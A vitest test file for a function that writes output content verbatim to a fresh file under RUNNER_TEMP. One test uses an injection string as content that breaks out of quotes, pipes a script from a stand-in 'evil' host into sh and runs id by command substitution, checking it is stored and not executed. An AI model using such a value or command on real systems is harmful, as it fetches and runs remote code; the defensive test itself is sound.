import { readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { afterEach, describe, expect, it } from 'vitest';
import { writeOutputFile } from '../src/output.js';

describe('writeOutputFile', () => {
  const runnerTemp = process.env.RUNNER_TEMP;
  afterEach(() => {
    if (runnerTemp === undefined) delete process.env.RUNNER_TEMP;
    else process.env.RUNNER_TEMP = runnerTemp;
  });

  it('writes the content verbatim to a new file in RUNNER_TEMP', () => {
    process.env.RUNNER_TEMP = tmpdir();
    const content = 'x"; curl https://evil | sh; echo "`$(id)`';
    const path = writeOutputFile('notes.md', content);
    expect(path.startsWith(tmpdir())).toBe(true);
    expect(path.endsWith('notes.md')).toBe(true);
    expect(readFileSync(path, 'utf8')).toBe(content);
  });

  it('uses a separate directory for every call', () => {
    expect(writeOutputFile('entry.md', 'a')).not.toBe(writeOutputFile('entry.md', 'b'));
  });
});
